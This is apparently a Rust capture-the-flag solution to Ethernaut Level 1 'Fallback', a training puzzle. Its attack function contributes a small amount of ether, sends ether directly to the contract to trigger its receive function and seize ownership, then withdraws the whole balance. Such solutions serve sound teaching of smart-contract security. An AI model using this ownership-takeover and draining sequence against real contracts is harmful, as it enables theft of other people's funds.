use async_trait::async_trait;
use ctf::ethernaut::lvl01_fallback::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     *  @title Ethernaut Level 1: Fallback
     *
     *  Look carefully at the contract's code below.
     *
     *  You will beat this target if
     *  1. you claim ownership of the contract
     *  2. you reduce its balance to 0
     *
     *  Things that might help:
     *  - How to send ether when interacting with an ABI
     *  - How to send ether outside of the ABI
     *  - Converting to and from wei/ether units (see
     *    help() command)
     *  - Fallback methods
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = Fallback::new(target.contract_address, offender.clone());

        println!("Calling contribute()...");
        contract.contribute().value(1).send().await?.await?;

        println!("Calling receive()...");
        offender
            .send_transaction(
                TransactionRequest::new().to(contract.address()).value(1),
                None,
            )
            .await?
            .await?;

        println!("Calling withdraw()...");
        contract.withdraw().send().await?.await?;

        Ok(())
    }
}
